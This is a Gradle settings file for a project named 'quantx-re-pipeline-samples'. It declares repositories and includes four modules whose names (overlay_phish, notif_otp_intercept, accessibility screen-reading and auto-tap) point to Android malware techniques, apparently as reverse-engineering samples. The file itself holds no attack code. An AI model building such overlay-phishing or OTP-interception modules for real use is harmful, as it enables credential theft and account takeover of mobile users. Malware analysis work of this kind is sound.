pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "quantx-re-pipeline-samples"

include(
    ":a11y_screen_reader",
    ":a11y_auto_tap",
    ":overlay_phish",
    ":notif_otp_intercept",
)
